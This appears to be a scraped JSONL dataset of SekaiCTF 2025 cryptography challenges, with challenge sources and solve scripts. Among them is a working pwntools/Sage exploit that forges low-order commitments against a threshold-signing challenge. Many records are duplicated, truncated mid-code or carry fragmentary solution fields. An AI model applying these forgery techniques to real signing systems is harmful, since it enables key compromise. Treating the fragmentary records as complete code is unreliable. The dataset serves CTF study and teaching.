so)\n        esk         =   seed_sk + so + p1 + sks\n        return      esk\n\n\n    def keygen(self):\n        \"\"\" UOV.classic.KeyGen(). \"\"\"\n\n\n    def sign(self, msg, sk):\n        \"\"\" UOV.Sign().\"\"\"\n\n\n        #   y = O * x\n        y = bytearray(v)        #   subtract from v\n        for i in range(self.m):\n            for j in range(self.v):\n                y[j] ^= self.gf_mul(mo[i][j], x[i])\n\n\n    def verify(self, sig, msg, pk):\n        \"\"\" UOV.Verify() and UOV.pkc.Verify(). Return boolean if valid. \"\"\"\n\n\n    def open(self, sm, pk):\n        \"\"\" Verify a signed message  sm = msg + sig. Return msg or None. \"\"\"\n        msg_sz  =   len(sm) - self.sig_sz\n        msg     =   sm[:msg_sz]\n        sig     =   sm[msg_sz:]\n        if not self.verify(sig, msg, pk):\n            return None\n        return msg\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring\\dist\\uov.py", "file_size": 17067, "scraped_at": "2025-10-26T18:19:39.518684"}
{"id": "project-sekai_sekaictf-2025_chall", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "chall", "attack_type": "Unknown", "writeup": "import random, os\n\np = 2 ** 256 - 189\nFLAG = os.getenv(\"FLAG\", \"SEKAI{}\")\n\ndef challenge(secret):\n\tt = int(input())\n\tassert 20 <= t <= 50, \"Number of parties not in range\"\n\n\tf = gen(t, secret)\n\n\tfor i in range(t):\n\t\tx = int(input())\n\t\tassert 0 < x < p, \"Bad input\"\n\t\tprint(poly_eval(f, x))\n\n\tif int(input()) == secret:\n\t\tprint(FLAG)\n\t\texit(0)\n\telse:\n\t\tprint(\":<\")\n\ndef gen(degree, secret):\n\tpoly = [random.randrange(0, p) for _ in range(degree + 1)]\n\tindex = random.randint(0, degree)\n\n\tpoly[index] = secret\n\treturn poly\n\ndef poly_eval(f, x):\n\treturn sum(c * pow(x, i, p) for i, c in enumerate(f)) % p\n\nif __name__ == \"__main__\":\n\tsecret = random.randrange(0, p)\n\tfor _ in range(2):\n\t\tchallenge(secret)", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\ssss\\dist\\chall.py", "file_size": 702, "scraped_at": "2025-10-26T18:19:39.531150"}
{"id": "project-sekai_sekaictf-2025_chall", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "chall", "attack_type": "Unknown", "writeup": "import random, os\n\np = 2 ** 256 - 189\nFLAG = os.getenv(\"FLAG\", \"SEKAI{}\")\n\ndef challenge(secret):\n\tt = int(input())\n\tassert 20 <= t <= 50, \"Number of parties not in range\"\n\n\tf = gen(t, secret)\n\n\tfor i in range(t):\n\t\tx = int(input())\n\t\tassert 0 < x < p, \"Bad input\"\n\t\tprint(poly_eval(f, x))\n\n\tif int(input()) == secret:\n\t\tprint(FLAG)\n\t\texit(0)\n\telse:\n\t\tprint(\":<\")\n\ndef gen(degree, secret):\n\tpoly = [random.randrange(0, p) for _ in range(degree + 1)]\n\tindex = random.randint(0, degree)\n\n\tpoly[index] = secret\n\treturn poly\n\ndef poly_eval(f, x):\n\treturn sum(c * pow(x, i, p) for i, c in enumerate(f)) % p\n\nif __name__ == \"__main__\":\n\tsecret = random.randrange(0, p)\n\tfor _ in range(2):\n\t\tchallenge(secret)", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\ssss\\challenge\\app\\chall.py", "file_size": 702, "scraped_at": "2025-10-26T18:19:39.532666"}
{"id": "project-sekai_sekaictf-2025_IO", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "IO", "attack_type": "Hash", "writeup": "from py_ecc.secp256k1 import P, G as G_lib, N\nfrom py_ecc.secp256k1.secp256k1 import multiply, add\nimport random\nimport os\nfrom hashlib import sha256\nimport sys\n\nCONTEXT = os.urandom(69)\nNUM_PARTIES = 9\nTHRESHOLD = (2 * NUM_PARTIES) // 3 + 1\nNUM_SIGNS = 100\nFLAG = os.environ.get(\"FLAG\", \"FLAG{I_AM_A_NINCOMPOOP}\")\n\n# IO\ndef send(msg):\n    print(msg, flush=True)\n\n\ndef handle_error(msg):\n    send(msg)\n    sys.exit(1)\n\n\ndef receive_line():\n    try:\n        return sys.stdin.readline().strip()\n    except BaseException:\n        handle_error(\"Connection closed by client. Exiting.\")\n\n\ndef input_int(range=P):\n    try:\n        x = int(receive_line())\n        assert 0 <= x <= range - 1\n        return x\n    except BaseException:\n        handle_error(\"Invalid input integer\")\n\n\ndef input_point():\n    try:\n        x = input_int()\n        y = input_int()\n        assert not (x == 0 and y == 0)\n        return Point(x, y)\n    except BaseException:\n        handle_error(\"Invalid input Point\")\n\n\n# Helper class\nclass Point:\n    \"\"\"easy operator overloading\"\"\"\n\n    def __init__(self, x, y):\n        self.point = (x, y)\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n    def __repr__(self):\n        return str(self.point)\n\n\nG = Point(*G_lib)\n\n\ndef random_element(P):\n    return random.randint(1, P - 1)\n\n\ndef H(*args):\n    return int.from_bytes(sha256(str(args).encode()).digest(), \"big\")\n\n\ndef sum_pts(points):\n    res = 0 * G\n    for point in points:\n        res = res + point\n    return res\n\n\ndef sample_poly(t):\n    return [random_element(N) for _ in range(t)]\n\n\ndef gen_proof(secret, i):\n    k = random_element(P)\n    R = k * G\n    mu = k + secret * H(CONTEXT, i, secret * G, R)\n    return R, mu % N\n\n\ndef verify_proof(C, R, mu, i):\n    c = H(CONTEXT, i, C, R)\n    return R == mu * G + (-c * C)\n\n\ndef gen_poly_comms(coeffs):\n    return [i * G for i in coeffs]\n\n\ndef eval_poly(coeffs, x):\n    res = 0\n    for coeff in coeffs[::-1]:\n        res = (res * x + coeff) % N\n    return res\n\n\ndef gen_shares(n, coeffs):\n    return {i: eval_poly(coeffs, i) for i in range(1, n + 1)}\n\n\ndef poly_eval_comms(comms, i):\n    return sum_pts([comms[k] * pow(i, k, N) for k in range(THRESHOLD)])\n\n\ndef check_shares(comms, shares, i):\n    return G * shares[i] == poly_eval_comms(comms, i)\n\n\ndef gen_nonsense():\n    d, e = random_element(N), random_element(N)\n    D, E = d * G, e * G\n    return (d, e), (D, E)\n\n\ndef lamb(i, S):\n    num, den = 1, 1\n    for j in S:\n        if j == i:\n            continue\n        num *= j\n        den *= (j - i)\n    return (num * pow(den, -1, N)) % N\n\n\ndef main():\n    \"\"\"https://eprint.iacr.org/2020/852.pdf\"\"\"\n    send(\"=\" * 50)\n    send(\"=== Law and Order! You should always include your friends to sign and you are mine <3 ===\")\n    send(\"=\" * 50)\n    send( f\"We have {NUM_PARTIES - 1} parties here, and you will be party #{NUM_PARTIES}.\")\n    send(f\"Idk why is our group signing not working\")\n    send(\"\\n--- Round 1: Commitment ---\")\n\n    # Keygen\n\n    send(f\"context string {CONTEXT.hex()}\")\n\n    your_id = NUM_PARTIES\n\n    all_coeffs = {}\n    all_comms = {}\n    for i in range(1, NUM_PARTIES):\n        # 1.1\n        coeffs = sample_poly(THRESHOLD)\n        # 1.2\n        zero_proof = gen_proof(coeffs[0], i)\n        # 1.3\n        comms = gen_poly_comms(coeffs)\n        # 1.5\n        if not verify_proof(comms[0], zero_proof[0], zero_proof[1], i):\n            handle_error(f\"[-] Party {i} secret PoK invalid\")\n        all_coeffs[i] = coeffs\n        all_comms[i] = comms\n        send(f\"[+] Commitments from party {i}:\")\n        for k, C_ik in enumerate(comms):\n            send(f\"  C_{i},{k} = {C_ik}\")\n\n    send(\"\\n[?] Now, provide the commitments (points) for your coefficients.\")\n    your_comms = [input_point() for _ in range(THRESHOLD)]\n    send(\"\\n[?] Finally, provide your proof-of-knowledge for your secret share (c_i,0).\")\n    send(\"[>] Send Point R:\")\n    your_zero_proof_R = input_point()\n    send(\"[>] Send mu:\")\n    your_zero_proof_mu = input_int()\n    your_zero_proof = (your_zero_proof_R, your_zero_proof_mu)\n\n    if not verify_proof(your_comms[0], your_zero_proof[0], your_zero_proof[1], your_id):\n        handle_error(f\"[-] party {your_id} secret PoK invalid\")\n    all_comms[your_id] = your_comms\n    send(\"[+] Your commitments and proof have been accepted.\")\n    send(\"\\n--- Round 2: Share Distribution ---\")\n\n    send(f\"[?] Please provide your shares for the other {NUM_PARTIES} parties.\")\n    # 2.1\n    your_shares = {}\n    for i in range(1, NUM_PARTIES + 1):\n        send(f\"[>] Send share for party {i}:\")\n        your_shares[i] = input_int(N)\n\n    # 2.2\n    for i in range(1, NUM_PARTIES + 1):\n        if n", "solution_code": "    print(msg, flush=True)\n\n\n    def __init__(self, x, y):\n        self.point = (x, y)\n\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n\n    def __repr__(self):\n        return str(self.point)\n\n\n    \"\"\"https://eprint.iacr.org/2020/852.pdf\"\"\"\n    send(\"=\" * 50)\n    send(\"=== Law and Order! You should always include your friends to sign and you are mine <3 ===\")\n    send(\"=\" * 50)\n    send( f\"We have {NUM_PARTIES - 1} parties here, and you will be party #{NUM_PARTIES}.\")\n    send(f\"Idk why is our group signing not working\")\n    send(\"\\n--- Round 1: Commitment ---\")\n\n\n    all_coeffs = {}\n    all_comms = {}\n    for i in range(1, NUM_PARTIES):\n        # 1.1\n        coeffs = sample_poly(THRESHOLD)\n        # 1.2\n        zero_proof = gen_proof(coeffs[0], i)\n        # 1.3\n        comms = gen_poly_comms(coeffs)\n        # 1.5\n        if not verify_proof(comms[0], zero_proof[0], zero_proof[1], i):\n            handle_error(f\"[-] Party {i} secret PoK invalid\")\n        all_coeffs[i] = coeffs\n        all_comms[i] = comms\n        send(f\"[+] Commitments from party {i}:\")\n        for k, C_ik in enumerate(comms):\n            send(f\"  C_{i},{k} = {C_ik}\")\n\n\n    all_shares = {}\n    for l in range(1, NUM_PARTIES):\n        shares_l = gen_shares(NUM_PARTIES, all_coeffs[l])\n        for i in range(1, NUM_PARTIES + 1):\n            if not check_shares(all_comms[l], shares_l, i):\n                handle_error(f\"[-] party {l} shares for party {i} invalid\")\n        all_shares[l] = shares_l\n        send(f\"[+] Share for you from party {l}: {shares_l[your_id]}\")\n    all_shares[your_id] = your_shares\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\law-and-order\\dist\\chall.py", "file_size": 9209, "scraped_at": "2025-10-26T18:19:39.548202"}
{"id": "project-sekai_sekaictf-2025_context.log_level_=_'debug'", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "context.log_level = 'debug'", "attack_type": "Hash", "writeup": "from sage.all import *\nfrom pwn import *\nfrom hashlib import sha256\nfrom ast import literal_eval\nfrom tqdm import tqdm\nfrom py_ecc.secp256k1 import P, G as G_lib, N\nfrom py_ecc.secp256k1.secp256k1 import multiply, add\n\n# context.log_level = 'debug'\n\nNUM_PARTIES = 9\nTHRESHOLD = 7\np = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f\nn = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141\n\nR = PolynomialRing(GF(p), ['x', 'y'])\nxbar, ybar = R.gens()\n\ndef jacobian_double(p):\n    \"\"\"\n    Double a point in Jacobian coordinates and return the result.\n\n    :param p: the point to double\n    :type p: PlainPoint3D\n\n    :return: the resulting Jacobian point\n    :rtype: PlainPoint3D\n    \"\"\"\n    # if not p[1]:\n    #     return (0, 0, 0)\n    ysq = (p[1] ** 2)\n    S = (4 * p[0] * ysq)\n    A = 0\n    M = (3 * p[0] ** 2 + A * p[2] ** 4)\n    nx = (M**2 - 2 * S)\n    ny = (M * (S - nx) - 8 * ysq**2)\n    nz = (2 * p[1] * p[2])\n    return (nx, ny, nz)\n\ndef send_point(p):\n    io.sendline(str(p.point[0]).encode())\n    io.sendline(str(p.point[1]).encode())\n\ndef send_int(n):\n    io.sendline(str(n).encode())\n\ndef jacobian_add(p, q, return_H=False):\n    \"\"\"\n    Add two points in Jacobian coordinates and return the result.\n\n    :param p: the first point to add\n    :type p: PlainPoint3D\n    :param q: the second point to add\n    :type q: PlainPoint3D\n\n    :return: the resulting Jacobian point\n    :rtype: PlainPoint3D\n    \"\"\"\n    # if not p[1]:\n    #     return q\n    # if not q[1]:\n    #     return p\n    U1 = (p[0] * q[2] ** 2)\n    U2 = (q[0] * p[2] ** 2)\n    S1 = (p[1] * q[2] ** 3)\n    S2 = (q[1] * p[2] ** 3)\n    # if U1 == U2:\n    #     if S1 != S2:\n    #         return (0, 0, 1)\n    #     return jacobian_double(p)\n    H = U2 - U1\n    R = S2 - S1\n    H2 = (H * H)\n    H3 = (H * H2)\n    U1H2 = (U1 * H2)\n    nx = (R**2 - H3 - 2 * U1H2)\n    ny = (R * (U1H2 - nx) - S1 * H3)\n    nz = (H * p[2] * q[2])\n    if return_H:\n        return (nx, ny, nz), H\n    return (nx, ny, nz)\n\nclass Point:\n    \"\"\"easy operator overloading\"\"\"\n\n    def __init__(self, x, y):\n        self.point = (x, y)\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n    def to_jacobian(self):\n        return (self.point[0], self.point[1], 1)\n\n    def __repr__(self):\n        return str(self.point)\n\nG = Point(*G_lib)\n\ndef H(*args):\n    return int.from_bytes(sha256(str(args).encode()).digest(), \"big\")\n\ndef verify_proof(C, R, mu, i):\n    c = H(CONTEXT, i, C, R)\n    return R == mu * G + (-c * C)\n\ndef sum_pts(points):\n    res = 0 * G\n    for point in points:\n        res = res + point\n    return res\n\ndef poly_eval_comms(comms, i):\n    return sum_pts([comms[k] * pow(i, k, N) for k in range(THRESHOLD)])\n\ndef check_shares(comms, shares, i):\n    return G * shares[i] == poly_eval_comms(comms, i)\n\ndef start():\n    global CONTEXT, io\n    io = process([\"python3\", \"chall.py\"])\n    io.recvuntil(b\"context string\")\n\n    CONTEXT = bytes.fromhex(io.recvline().strip().decode())\n\n    all_comms = {}\n\n    for i in range(1, 9):\n        io.recvuntil(b\"[+] Commitments from party \")\n        io.recvline()\n        comm = []\n        for j in range(THRESHOLD):\n            c_j = literal_eval(io.recvline().strip().decode().split(\"=\")[-1].strip())\n            comm.append(Point(*c_j))\n        all_comms[i] = comm\n\n    pt0 = sum([all_comms[i][0] for i in range(1, NUM_PARTIES)], Point(0, 0))\n\n    P0 = (0, ybar, 1)\n    PA = jacobian_add(P0, pt0.to_jacobian())\n    poly1 = PA[1]\n    p3 = poly1.univariate_polynomial()\n\n    def find():\n        for y0 in p3.roots(multiplicities=False):\n            if y0 == 0:\n                continue\n            your_comm0 = Point(0, int(y0))\n            if (pt0 + your_comm0).point[1] != 0:\n                continue\n            return your_comm0\n\n    your_comm0 = find()\n    if your_comm0 is None:\n        io.close()\n        return\n\n    assert (pt0 + your_comm0).point[1] == 0, (pt0 + your_comm0)\n    assert (3 * your_comm0).point == (0, 0), (3 * your_comm0)\n\n    def find_mu():\n        for mu in range(1, 10000):\n            R0 = mu * G\n            if verify_proof(your_comm0, R0, mu, NUM_PARTIES):\n                print(f\"Found mu: {mu}\")\n                return R0, mu\n\n    your_zero_proof = find_mu()\n    your_comms = [your_comm0, Point(1, 0), Point(1, 0), Point(1, 0), Point(1, 0), Point(1, 0), Point(1, 0)]\n    shares = [None, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n\n    for i in range(1, NUM_PARTIES + 1):\n        print(i, check_shares(your_comms, shares, i))\n\n    for your_comm in your_comms:\n        send_point(your_comm)\n    all_comms[NUM_PARTIES] = your_comms\n\n    send_point(your_zero_proof[0])\n    send_int(your_zero_proof[1])\n\n    i", "solution_code": "    def __init__(self, x, y):\n        self.point = (x, y)\n\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n\n    def to_jacobian(self):\n        return (self.point[0], self.point[1], 1)\n\n\n    def __repr__(self):\n        return str(self.point)\n\n\n    for i in range(1, 9):\n        io.recvuntil(b\"[+] Commitments from party \")\n        io.recvline()\n        comm = []\n        for j in range(THRESHOLD):\n            c_j = literal_eval(io.recvline().strip().decode().split(\"=\")[-1].strip())\n            comm.append(Point(*c_j))\n        all_comms[i] = comm\n\n\n    def find():\n        for y0 in p3.roots(multiplicities=False):\n            if y0 == 0:\n                continue\n            your_comm0 = Point(0, int(y0))\n            if (pt0 + your_comm0).point[1] != 0:\n                continue\n            return your_comm0\n\n\n    def find_mu():\n        for mu in range(1, 10000):\n            R0 = mu * G\n            if verify_proof(your_comm0, R0, mu, NUM_PARTIES):\n                print(f\"Found mu: {mu}\")\n                return R0, mu\n\n\n    for i in range(1, NUM_PARTIES + 1):\n        print(i, check_shares(your_comms, shares, i))\n\n\n    my_shares = {}\n    for i in range(1, NUM_PARTIES):\n        io.recvuntil(b\"[+] Share for you from party \")\n        my_shares[i] = int(io.recvline().strip().decode().split(\":\")[-1].strip())\n    my_shares[NUM_PARTIES] = 0\n\n\n    target_point = sum_pts([poly_eval_comms(all_comms[j], NUM_PARTIES) for j in range(1, NUM_PARTIES + 1)])\n    poly = 4 * ybar**2 - 3 * target_point.point[0] ** 3\n    if len(poly.univariate_polynomial().roots(multiplicities=False)) == 0:\n        print(\"No roots found for the polynomial, exiting.\")\n        io.close()\n        return\n\n\n    def gen_D_E():\n        while True:\n            r = randint(1, p)\n            E = Point(12*r**2 % p, 36*r**3 % p)\n            D = (1337, ybar, 1)\n            nonce = jacobian_add(D, E.to_jacobian())\n            poly = nonce[1]\n            poly = poly.univariate_polynomial()\n            for y0 in poly.roots(multiplicities=False):\n                if y0 == 0:\n                    continue\n                D = Point(1337, int(y0))\n                nonsense_ordered = [(NUM_PARTIES, D, E)]\n                m = \"GIVE ME THE FLAG PLEASE\"\n                rho = H(NUM_PARTIES, m, nonsense_ordered)\n                if rho % 3 == 1:\n                    group_nonsense = D + E\n                    group_challenge = H(group_nonsense, group_public_key, m)\n                    if group_challenge % 3 != 0:\n                        continue\n                    return D, E\n\n\n    io.recvuntil(b\"[+] Set of signers for this round: \")\n    signers = literal_eval(io.recvline().strip().decode())\n    print(f\"Signers: {signers}\")\n    if len(signers) > 1:\n        io.close()\n        return\n\n\n    io.recvuntil(b\"[+] Group challenge `c`: \")\n    c = int(io.recvline().strip().decode())\n    print(f\"Challenge {c}, {c % 3}\")\n    send_int(0)\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\law-and-order\\solution\\solve.py", "file_size": 7324, "scraped_at": "2025-10-26T18:19:39.563284"}
{"id": "project-sekai_sekaictf-2025_IO", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "IO", "attack_type": "Hash", "writeup": "from py_ecc.secp256k1 import P, G as G_lib, N\nfrom py_ecc.secp256k1.secp256k1 import multiply, add\nimport random\nfrom secrets import randbelow\nimport os\nfrom hashlib import sha256\nimport sys\n\nCONTEXT = os.urandom(69)\nNUM_PARTIES = 9\nTHRESHOLD = (2 * NUM_PARTIES) // 3 + 1\nNUM_SIGNS = 100\nFLAG = os.environ.get(\"FLAG\", \"FLAG{I_AM_A_NINCOMPOOP}\")\n\n# IO\ndef send(msg):\n    print(msg, flush=True)\n\n\ndef handle_error(msg):\n    send(msg)\n    sys.exit(1)\n\n\ndef receive_line():\n    try:\n        return sys.stdin.readline().strip()\n    except BaseException:\n        handle_error(\"Connection closed by client. Exiting.\")\n\n\ndef input_int(range=P):\n    try:\n        x = int(receive_line())\n        assert 0 <= x <= range - 1\n        return x\n    except BaseException:\n        handle_error(\"Invalid input integer\")\n\n\ndef input_point():\n    try:\n        x = input_int()\n        y = input_int()\n        assert not (x == 0 and y == 0)\n        return Point(x, y)\n    except BaseException:\n        handle_error(\"Invalid input Point\")\n\n\n# Helper class\nclass Point:\n    \"\"\"easy operator overloading\"\"\"\n\n    def __init__(self, x, y):\n        self.point = (x, y)\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n    def __repr__(self):\n        return str(self.point)\n\n\nG = Point(*G_lib)\n\n\ndef random_element(P):\n    return randbelow(P - 1) + 1\n\n\ndef H(*args):\n    return int.from_bytes(sha256(str(args).encode()).digest(), \"big\")\n\n\ndef sum_pts(points):\n    res = 0 * G\n    for point in points:\n        res = res + point\n    return res\n\n\ndef sample_poly(t):\n    return [random_element(N) for _ in range(t)]\n\n\ndef gen_proof(secret, i):\n    k = random_element(P)\n    R = k * G\n    mu = k + secret * H(CONTEXT, i, secret * G, R)\n    return R, mu % N\n\n\ndef verify_proof(C, R, mu, i):\n    c = H(CONTEXT, i, C, R)\n    return R == mu * G + (-c * C)\n\n\ndef gen_poly_comms(coeffs):\n    return [i * G for i in coeffs]\n\n\ndef eval_poly(coeffs, x):\n    res = 0\n    for coeff in coeffs[::-1]:\n        res = (res * x + coeff) % N\n    return res\n\n\ndef gen_shares(n, coeffs):\n    return {i: eval_poly(coeffs, i) for i in range(1, n + 1)}\n\n\ndef poly_eval_comms(comms, i):\n    return sum_pts([comms[k] * pow(i, k, N) for k in range(THRESHOLD)])\n\n\ndef check_shares(comms, shares, i):\n    return G * shares[i] == poly_eval_comms(comms, i)\n\n\ndef gen_nonsense():\n    d, e = random_element(N), random_element(N)\n    D, E = d * G, e * G\n    return (d, e), (D, E)\n\n\ndef lamb(i, S):\n    num, den = 1, 1\n    for j in S:\n        if j == i:\n            continue\n        num *= j\n        den *= (j - i)\n    return (num * pow(den, -1, N)) % N\n\n\ndef main():\n    \"\"\"https://eprint.iacr.org/2020/852.pdf\"\"\"\n    send(\"=\" * 50)\n    send(\"=== Law and Order! You should always include your friends to sign and you are mine <3 ===\")\n    send(\"=\" * 50)\n    send( f\"We have {NUM_PARTIES - 1} parties here, and you will be party #{NUM_PARTIES}.\")\n    send(f\"Idk why is our group signing not working\")\n    send(\"\\n--- Round 1: Commitment ---\")\n\n    # Keygen\n\n    send(f\"context string {CONTEXT.hex()}\")\n\n    your_id = NUM_PARTIES\n\n    all_coeffs = {}\n    all_comms = {}\n    for i in range(1, NUM_PARTIES):\n        # 1.1\n        coeffs = sample_poly(THRESHOLD)\n        # 1.2\n        zero_proof = gen_proof(coeffs[0], i)\n        # 1.3\n        comms = gen_poly_comms(coeffs)\n        # 1.5\n        if not verify_proof(comms[0], zero_proof[0], zero_proof[1], i):\n            handle_error(f\"[-] Party {i} secret PoK invalid\")\n        all_coeffs[i] = coeffs\n        all_comms[i] = comms\n        send(f\"[+] Commitments from party {i}:\")\n        for k, C_ik in enumerate(comms):\n            send(f\"  C_{i},{k} = {C_ik}\")\n\n    send(\"\\n[?] Now, provide the commitments (points) for your coefficients.\")\n    your_comms = [input_point() for _ in range(THRESHOLD)]\n    send(\"\\n[?] Finally, provide your proof-of-knowledge for your secret share (c_i,0).\")\n    send(\"[>] Send Point R:\")\n    your_zero_proof_R = input_point()\n    send(\"[>] Send mu:\")\n    your_zero_proof_mu = input_int()\n    your_zero_proof = (your_zero_proof_R, your_zero_proof_mu)\n\n    if not verify_proof(your_comms[0], your_zero_proof[0], your_zero_proof[1], your_id):\n        handle_error(f\"[-] party {your_id} secret PoK invalid\")\n    all_comms[your_id] = your_comms\n    send(\"[+] Your commitments and proof have been accepted.\")\n    send(\"\\n--- Round 2: Share Distribution ---\")\n\n    send(f\"[?] Please provide your shares for the other {NUM_PARTIES} parties.\")\n    # 2.1\n    your_shares = {}\n    for i in range(1, NUM_PARTIES + 1):\n        send(f\"[>] Send share for party {i}:\")\n        your_shares[i] = input_int(N)\n\n    # 2.2\n    for i in range(1, NUM_", "solution_code": "    print(msg, flush=True)\n\n\n    def __init__(self, x, y):\n        self.point = (x, y)\n\n\n    def __add__(self, other):\n        return Point(*add(self.point, other.point))\n\n\n    def __mul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __rmul__(self, scalar):\n        return Point(*multiply(self.point, scalar))\n\n\n    def __neg__(self):\n        return Point(self.point[0], -self.point[1])\n\n\n    def __eq__(self, other):\n        return (self + (-other)).point[0] == 0\n\n\n    def __repr__(self):\n        return str(self.point)\n\n\n    \"\"\"https://eprint.iacr.org/2020/852.pdf\"\"\"\n    send(\"=\" * 50)\n    send(\"=== Law and Order! You should always include your friends to sign and you are mine <3 ===\")\n    send(\"=\" * 50)\n    send( f\"We have {NUM_PARTIES - 1} parties here, and you will be party #{NUM_PARTIES}.\")\n    send(f\"Idk why is our group signing not working\")\n    send(\"\\n--- Round 1: Commitment ---\")\n\n\n    all_coeffs = {}\n    all_comms = {}\n    for i in range(1, NUM_PARTIES):\n        # 1.1\n        coeffs = sample_poly(THRESHOLD)\n        # 1.2\n        zero_proof = gen_proof(coeffs[0], i)\n        # 1.3\n        comms = gen_poly_comms(coeffs)\n        # 1.5\n        if not verify_proof(comms[0], zero_proof[0], zero_proof[1], i):\n            handle_error(f\"[-] Party {i} secret PoK invalid\")\n        all_coeffs[i] = coeffs\n        all_comms[i] = comms\n        send(f\"[+] Commitments from party {i}:\")\n        for k, C_ik in enumerate(comms):\n            send(f\"  C_{i},{k} = {C_ik}\")\n\n\n    all_shares = {}\n    for l in range(1, NUM_PARTIES):\n        shares_l = gen_shares(NUM_PARTIES, all_coeffs[l])\n        for i in range(1, NUM_PARTIES + 1):\n            if not check_shares(all_comms[l], shares_l, i):\n                handle_error(f\"[-] party {l} shares for party {i} invalid\")\n        all_shares[l] = shares_l\n        send(f\"[+] Share for you from party {l}: {shares_l[your_id]}\")\n    all_shares[your_id] = your_shares\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\law-and-order\\challenge\\app\\chall.py", "file_size": 9407, "scraped_at": "2025-10-26T18:19:39.580716"}
{"id": "project-sekai_sekaictf-2025_idog", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "idog", "attack_type": "AES", "writeup": "from hashlib import sha256\nfrom Crypto.Cipher import AES\n\nx = int(input('Enter an 8-digit multiplicand: '))\ny = int(input('Enter a 7-digit multiplier: '))\nassert 1e6 <= y < 1e7 <= x < 1e8, \"Incorrect lengths\"\nassert x * y != 3_81_40_42_24_40_28_42, \"Insufficient ntr-opy\"\n\ndef dream_multiply(x, y):\n    x, y = str(x), str(y)\n    assert len(x) == len(y) + 1\n    digits = x[0]\n    for a, b in zip(x[1:], y):\n        digits += str(int(a) * int(b))\n    return int(digits)\nassert dream_multiply(x, y) == x * y, \"More like a nightmare\"\n\nct = '75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89'\nprint(AES.new(sha256(str((x, y)).encode()).digest(), AES.MODE_ECB).decrypt(bytes.fromhex(ct)).decode())", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\i-dream-of-genni\\dist\\idog.py", "file_size": 770, "scraped_at": "2025-10-26T18:19:39.591889"}
{"id": "project-sekai_sekaictf-2025_this_script_prints_out_two_solutions:", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "this script prints out two solutions:", "attack_type": "Unknown", "writeup": "pairs = [(x,y) for x in range(1,10) for y in range(1,10) if x*y >= 10]\n\ndef multwo(i, j, digits):\n    s, mul = 0, 1\n    for z in range((digits+1)//2):\n        s += (i % 10) * (j % 10) * mul\n        i, j, mul = i // 10, j // 10, mul * 100\n    return s\n\ndef process(x, y, digits, N = 7):\n    if digits == N:\n        n1 = x*y - multwo(x,y,N*2)\n        n2 = 10**N * (10**N - y)\n        if n1 < 10 * n2 and n1 % n2 == 0:\n            print(f'{n1//n2}{x}, {y}')\n        return       \n    mul = 10**digits\n    for a, b in pairs:\n        x2 = a*mul + x\n        y2 = b*mul + y\n        if (multwo(x2, y2, digits+1) - x2*y2) % (10*mul) == 0:\n            process(x2, y2, digits+1)\n\nprocess(0,0,0)\n\n# this script prints out two solutions:\n# 49228443, 9773647\n# 39876877, 9564546\n# the second one is from the image, so we use the first one", "solution_code": "    if digits == N:\n        n1 = x*y - multwo(x,y,N*2)\n        n2 = 10**N * (10**N - y)\n        if n1 < 10 * n2 and n1 % n2 == 0:\n            print(f'{n1//n2}{x}, {y}')\n        return       \n    mul = 10**digits\n    for a, b in pairs:\n        x2 = a*mul + x\n        y2 = b*mul + y\n        if (multwo(x2, y2, digits+1) - x2*y2) % (10*mul) == 0:\n            process(x2, y2, digits+1)\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\i-dream-of-genni\\solution\\solve.py", "file_size": 824, 